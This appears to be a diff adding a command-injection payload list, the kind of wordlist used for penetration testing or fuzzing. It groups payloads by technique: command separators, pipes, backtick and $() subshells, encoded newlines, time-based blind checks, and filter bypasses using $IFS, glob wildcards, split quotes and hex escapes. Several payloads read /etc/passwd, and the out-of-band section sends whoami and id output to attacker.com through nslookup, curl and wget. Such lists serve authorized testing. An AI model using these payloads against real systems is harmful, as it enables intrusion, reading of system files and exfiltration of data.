@@ -1,0 +1,60 @@
+# Basic injection - semicolon / ampersand
+;id
+;whoami
+;uname -a
+& dir
+& whoami
+
+# Pipe injection
+|id
+|cat /etc/passwd
+| type C:\Windows\win.ini
+
+# Backtick subshell
+`id`
+`whoami`
+
+# $() subshell
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+
+# Chained operators
+&& id
+&& whoami
+|| id
+
+# Newline injection
+%0aid
+%0d%0aid
+\nid
+
+# Blind - time-based
+;sleep 5
+|sleep 5
+$(sleep 5)
+& ping -n 5 127.0.0.1
+& timeout /t 5
+
+# Blind - DNS callback / OOB
+;nslookup attacker.com
+$(nslookup $(whoami).attacker.com)
+;curl http://attacker.com/$(whoami)
+|wget http://attacker.com/$(id|base64)
+
+# Filter bypass - space bypass ($IFS)
+;cat${IFS}/etc/passwd
+;{cat,/etc/passwd}
+;cat$IFS/etc/passwd
+
+# Filter bypass - path bypass (wildcards / glob)
+/???/??t /???/??ss??
+/???/??n/??rl http://attacker.com
+
+# Filter bypass - quote bypass
+;w'h'o'a'm'i
+;w"h"o"a"m"i
+;$'\x77\x68\x6f\x61\x6d\x69'
+
+# Filter bypass - wildcard bypass
+;/bin/ca? /etc/pas?wd
